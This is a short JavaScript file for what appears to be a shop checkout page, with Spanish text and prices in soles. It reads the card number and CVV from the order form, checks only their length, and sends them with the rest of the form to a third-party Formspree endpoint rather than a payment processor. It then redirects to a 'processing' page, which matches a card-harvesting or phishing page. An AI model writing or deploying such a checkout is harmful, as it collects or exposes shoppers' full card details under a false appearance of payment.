document.addEventListener("DOMContentLoaded", () => {
  const params = new URLSearchParams(window.location.search);
  const producto = params.get("producto");
  const precio = params.get("precio");

  if (producto && precio) {
    document.getElementById("producto").value = producto;
    document.getElementById("precio").value = "S/ " + precio;
  }

  const form = document.getElementById("pedido-form");
  if (form) {
    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const tarjeta = document.getElementById("tarjeta").value.trim();
      const cvv = document.getElementById("cvv").value.trim();

      // Validaciones simples
      if (tarjeta && tarjeta.length < 16) {
        alert("El número de tarjeta debe tener al menos 16 dígitos.");
        return;
      }
      if (cvv && cvv.length < 3) {
        alert("El CVV debe tener 3 dígitos.");
        return;
      }

      const formData = new FormData(form);

      try {
        const response = await fetch("https://formspree.io/f/mnnbkeaj", {
          method: "POST",
          body: formData,
          headers: { Accept: "application/json" },
        });

        if (response.ok) {
          window.location.href = "procesando.html";
        } else {
          alert("Error al enviar el formulario. Inténtalo de nuevo.");
        }
      } catch (err) {
        alert("Error de conexión. Inténtalo más tarde.");
      }
    });
  }
});
